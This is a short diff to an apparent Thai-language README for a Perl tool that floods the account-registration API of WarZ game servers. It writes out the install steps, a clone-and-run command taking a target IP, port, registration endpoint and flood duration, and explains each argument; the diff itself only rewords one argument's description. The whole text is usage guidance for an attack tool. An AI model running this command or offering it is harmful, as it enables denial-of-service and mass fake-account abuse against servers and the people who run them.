@@ -3,7 +3,7 @@
 (centos: yum -y install perl | kail : apt-get install perl)
 
 git clone https://github.com/c0ed4e4/apiwarz.git && perl api.pl 1.1.1.1 80 /WarZ/api/api_AccRegister.aspx 120       
-1.1.1.1 = IP / URL ไม่ต้องที่ http:// | /            
+1.1.1.1 = IP / URL ไม่ต้องที่ http:// และ /          
 80 = Port ของ website             
 /WarZ/api/api_AccRegister.aspx = ที่อยู่ของ api เช่น http://1.1.1.1/WarZ/api/api_AccRegister.aspx (ของแต่ละเซิฟไม่เหมือนกัน)    
 120 = Time ที่จะใช้ flood id
